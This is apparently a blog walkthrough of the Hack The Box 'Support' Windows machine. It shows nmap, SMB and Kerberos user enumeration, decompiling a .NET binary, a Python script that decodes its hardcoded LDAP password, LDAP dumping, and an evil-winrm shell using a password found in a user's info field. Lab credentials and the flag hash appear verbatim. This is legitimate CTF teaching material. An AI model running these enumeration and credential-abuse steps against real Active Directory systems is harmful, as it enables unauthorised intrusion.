---
title: "Support Machine"
date: 2022-10-29T00:00:00Z
draft: false
TableOfContents: true
---


## About the machine

{{< figure src="../../images/support.png" title="Support Machine Banner" width="600" >}}



| data |  |
|--------| ------- |
| Machine | Support |
| Platform | Hackthebox |
| url | [link](https://app.hackthebox.com/machines/Support) |
| creator | [0xdf](https://app.hackthebox.com/users/4935) |
| OS | Windows |
| Release data | 30 July 2022 |
| Difficulty | Easy |
| Points | 20 |
| ip | 10.10.11.174 |



## Getting user.txt flag


Run:

```bash
export ip=10.10.11.174
```


### Reconnaissance

#### Service/ Port enumeration

Run nmap to enumerate open ports, services, OS, and traceroute. Do a general enumeration not to make too much noise:

```bash
sudo nmap $ip -Pn
```

Results:

```
Nmap scan report for 10.10.11.174
Host is up (0.034s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
```

Once you know open ports, run nmap to see service versions and more details:   

```bash
sudo nmap -sCV -p3,88,135,139,389,445,464,593,636,3268,3269 $ip
```

Results:

```
Nmap scan report for 10.10.11.174
Host is up (0.034s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 15:56:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-11-08T15:56:49
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.69 seconds
zsh: segmentation fault  sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $ip
```

A few facts that you can gather after running this scan are:
+ There is a Windows Server running an Active Directory LDAP in the machine.
+ ldap and kerberos are available.
+ Domain: support.htb0.


#### Enumerate

Now, we can perform some basic enumeration to gather data about the target.

```bash
enum4linux 10.10.11.174
```

Among the lines in the results, you can see these interesting lines:

```
=========================================( Target Information )=========================================
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================( Session Check on 10.10.11.174 )===================================    
[+] Server 10.10.11.174 allows sessions using username '', password ''

================================( Getting domain SID for 10.10.11.174 )================================             
Domain Name: SUPPORT                                                                     
Domain Sid: S-1-5-21-1677581083-3380853377-188903654
```

Using the tool kerbrute, we will enumerate some valid usernames in the active directory:

```
(kali㉿kali)-[~/tools/kerbrute/dist]
└─$ ./kerbrute_linux_amd64 userenum -d support --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Results:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/09/22 - Ronnie Flathers @ropnop

2022/11/09 05:16:54 >  Using KDC(s):
2022/11/09 05:16:54 >   10.10.11.174:88

2022/11/09 05:16:56 >  [+] VALID USERNAME:  support@support
2022/11/09 05:16:57 >  [+] VALID USERNAME:  guest@support
2022/11/09 05:17:03 >  [+] VALID USERNAME:  administrator@support
2022/11/09 05:17:52 >  [+] VALID USERNAME:  Guest@support
2022/11/09 05:17:53 >  [+] VALID USERNAME:  Administrator@support
2022/11/09 05:19:42 >  [+] VALID USERNAME:  management@support
2022/11/09 05:19:59 >  [+] VALID USERNAME:  Support@support
2022/11/09 05:20:52 >  [+] VALID USERNAME:  GUEST@support
2022/11/09 05:31:02 >  [+] VALID USERNAME:  SUPPORT@support

```

The same thing we did with kerbrute, we could have done it with dnsrecon.

Samba service is open so we can try to enumerate the shares provided by the host:

```bash
# -L looks at what services are available on a target and -N forces the tool not to ask for a password
smbclient -L //$ip -N
```

Results:

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


### Initial access

After trying to connect to ADMIN$, C$, we connect to the share "support-tools":

```bash
smbclient /\\10.10.11.174/\support-tools
```

This way, we obtain a prompt command line in samba (smb: \>). Typing help in that command line you can see which commands you can execute.

Also, we list the content in the folder:

```smb
dir
```

Results:

```
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 968945 blocks available
```

Also, we check permissions on the share and we learn that we only have read permissions. Now we are going to retrieve all these files to pay close attention. Among the commands you can execute you have mget. So we run:

```smb
mget *
```

This will download all the files to the local folder from where you initiated your samba connection. Close the connection:

```smb
quit
```

Now, have a close look at the files we have downloaded. Unzip UserInfo.exe.zip file:

```bash
unzip UserInfo.exe.zip
```

After unzipping UserInfo.exe.zip, you have two files: UserInfo.exe and UserInfo.exe.config. Run:

```bash
cat UserInfo.exe.config
```

Result:

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

From this, we can know that UserInfo.exe is a binary assembled with the .NETFramework. Basically, this executable appears to be used to pull user information, likely from Active Directory. Now, if we want to go further in our inspection we will need a .NET decompiler for Linux. Here we have several options.


Since it's open source and we are using a kali virtual machine to perform this penetration test, let's use [ILSpy](https://github.com/icsharpcode/ILSpy/), but you can have a look at alternative tools at the end of this walkthrough. To run ILSpy, you need to install it before. Also, it has some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:

```bash
cd ~/tools/AvaloniaILSpy/artifacts/linux-x64
./ILSpy
```

Open UserInfo.exe in the program and inspect the code. There are several parts in the code:

+ References
+ {}
+ {} UserInfo
+ {} UserInfo.Commands
+ {} UserInfo.Services

In the UserInfo.Services you can find the LdadQuery():

![ILSpy](https://github.com/amandaguglieri/walkthroughs/blob/main/resources/ilspy.png)


```
using System.DirectoryServices;

public LdapQuery()
{
	//IL_0018: Unknown result type (might be due to invalid IL or missing references)
	//IL_0022: Expected O, but got Unknown
	//IL_0035: Unknown result type (might be due to invalid IL or missing references)
	//IL_003f: Expected O, but got Unknown
	string password = Protected.getPassword();
	entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	entry.set_AuthenticationType((AuthenticationTypes)1);
	ds = new DirectorySearcher(entry);
}
```

From where we stand, we can understand that LdapQuery() function is used to login into the Active Directory with the user "support". As a password, it calls the getPassword() function. Let's click on that function in the code to see it:

```
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
```

Here we can see the necessary steps that we will need to reverse the password if, in the end, we are able to retrieve it. Now, let's click on two function calls: "enc_password" and the private function "key".

```
# enc_password function
// UserInfo.Services.Protected
using System.Text;

private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
```

```
# private static byte[] key
// UserInfo.Services.Protected
using System.Text;

private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

With these two last elements, we can write a script to reverse the function getPassword() and ultimately obtain the password used for "support" user to access the Active Directory.

Save the script as script.py and this content:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b'armando'

array = base64.b64decode(enc_password)
array2 = ''
for i in range(len(array)):
    array2 += chr(array[i] ^ key[i%len(key)] ^ 223)

print(array2)
´´´

Now, give script.py execution permissions and run it:

```bash
chmod +x script.py
python script.py
```

Decrypted password would be: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Before going on, there is another way to get the password besides writing this python script. One of them, for instance, would involve:

1. Opening a windows machine in the tun0 network range.
2. Opening wireshark and capturing tun0 interface.
3. Running the executable UserInfo.exe from the windows machine.
4. Examining in wireshark the LDAP authentication packet (Follow TCP Stream in a request to port 389).


Summing up, we have:

+ user: support
+ password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+ ldap directory: support.htb


Now we can use a tool such as ldapsearch to open a connection to the LDAP server, bind, and perform a search using specified parameters, like:

```
-b searchbase 	Use searchbase as the starting point for the search instead of the default.
-x 		Use simple authentication instead of SASL.
-D binddn	Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.
-w passwd       Use passwd as the password for simple authentication.
-H ldapuri	Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected
```

Using ldapsearch, we run:

```bash
# # ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
```

Results are long and provided in text form. By using a tool such as ldapdomaindump we can get cool results in different formats: .grep, .html, and .json.

```bash
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```

Then, we can run:

```bash
firefox domain_users.html
```

Results:

![screenshot](https://github.com/amandaguglieri/walkthroughs/blob/main/resources/users-ldap.png)

It looks like the support user account has the most permissions. We have a closer look to this user in the results obtained in the ldapsearch:

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20221109173336.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 81981
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133124888166969633
```

There! Usually, the field "Info" is left empty but in this case, you can read: "Ironside47pleasure40Watchful", which might be a credential. Assuming that it is, we are going to enumerate user information in AD through the LDAP protocol. And for that, there exists a tool called evil-winrm.

**What does evil-winrm do?** evil-winrm is a WinRM shell for hacking/penthesting purposes.

**And what is WinRM?** WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. [Download evil-winrm repo here](https://github.com/Hackplayers/evil-winrm).

Run:

```bash
evil-winrm -i dc.support.htb -u support -p "Ironside47pleasure40Watchful"
```

And we will connect to a powershell terminal: PS C:\Users\support\Documents

To get the user.txt flag, run:

```
cd ..
dir
cd Desktop
dir
type user.txt
```

Result:

```
561ec390613a0f53b431d3e14e923de6
```


## Getting the System's flag

Coming soon.


## Tools in this lab


Before going through this write-up, you may have a look at some tools needed to solve it in case you prefer to investigate them and try harder instead of reading directly the solution.

**kerbrute**

Created by ropnop. [Download repo](https://github.com/ropnop/kerbrute). A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.

Nicely done in go, so to install it first you need to make sure that go is installed. Otherwise, run:

```bash
sudo apt update && sudo apt install golang
```

Then, follow the instructions from the repo.

**enum4linux**

Preinstalled in a kali machine. Tool to exploit null sessions by using some PERL scripts. Some cool commands here:

enum4linux -S <target IP>     // enumerates shares
enum4linux -U <target IP>     // enumerates users
enum4linux -M <target IP>     // enumerates machine list
enum4linux -enuP<target IP>   // displays the password policy in case you need to mount a network authentification attack
enum4linux -u <target IP>     // specify username to use (default “”)
enum4linux -p <target IP>     // specify password to use (default “”)
enum4linux -s /usr/share/enum4linux/share-list.txt <target IP>    // Also you can use brute force by adding a file

**dnspy**

Created by a bunch of contributors. [Download the repo](https://github.com/dnSpy/dnSpy).
dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. There is a but: this tool is for windows

To install, open powershell in windows and run:

```PS
git clone --recursive https://github.com/dnSpy/dnSpy.git
cd dnsSpy
build.ps1 -NoMbuild
```

**ILSpy**

Open source alternative for dnspy. [Download from repo; ILSpy](https://github.com/icsharpcode/ILSpy/). To install ILSpy, you need to install some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:

```bash
cd ~/tools/AvaloniaILSpy/artifacts/linux-x64
./ILSpy
```


## What I learned

When doing Support Machine I was faced with some challenging missions:

**Enumerating shares as part of a Null session attack.**

A null session attack exploits an authentification vulnerability for Windows Administrative Shares. This lets an attacker connect to a local or remote share without authentification. Therefore, it lets an attacker enumerate precious info such as passwords, system users, system groups, running system processes... The challenge here was to choose the best-suited tools to perform this enumeration. On my mental repo, I had:

+ Samba suite
+ Enum4linux

But there is also a nmap script for smb enumeration.

**Finding a .NET decompiler for Linux**

There are well-known decompilers out there. For windows you have [dnSpy](https://github.com/dnSpy/dnSpy) and many more. In linux you have the open source [ILSpy](https://github.com/icsharpcode/ILSpy/). BUT: Installation required some dependencies. There were more tools (wine).


**Ldap enumerating tools**

ldap-utils are preinstalled in kali, but before this lab, I didn't have had the chance to try them out.

*ldapsearch*

Syntax:

```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

An example:

```bash
ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
```

*ldapdomaindump*

I have enjoyed this tool for real! It's pretty straightforward and you get legible results. An example of how to run it:

```bash
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```
